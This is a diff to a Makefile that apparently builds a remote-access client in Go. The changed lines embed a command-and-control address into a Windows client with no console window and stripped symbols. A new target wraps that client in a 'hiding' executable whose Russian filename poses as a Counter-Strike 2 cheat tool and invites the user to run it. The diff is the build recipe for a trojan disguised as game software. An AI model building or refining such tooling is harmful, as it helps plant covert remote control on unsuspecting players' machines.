@@ -1,6 +1,8 @@
 .PHONY: all proto clean
 
-all: proto build-linux build-windows
+all: proto build-linux build-windows-n-hide
+
+C2_IP = "192.168.1.174:50051"
 
 proto:
 	protoc --go_out=. --go_opt=paths=source_relative \
@@ -14,7 +16,11 @@ build-linux:
 
 build-windows:
 	mkdir -p build
-	GOOS=windows GOARCH=amd64 go build -ldflags="-H=windowsgui -s -w" -o build/client.exe ./cmd/client/main_windows.go
+	GOOS=windows GOARCH=amd64 go build -ldflags="-H=windowsgui -s -w -X 'main.C2=$(C2_IP)'" -o build/client.exe ./cmd/client/main_windows.go
+
+build-windows-n-hide: build-windows
+	cp build/client.exe cmd/hiding/
+	GOOS=windows GOARCH=amd64 go build -o "build/трояны без читов кс2 много запусти меня.exe" ./cmd/hiding/main.go
 
 clean:
-	rm -rf build internal/proto/*.pb.go
+	rm -rf build internal/proto/*.pb.go cmd/hiding/*.exe
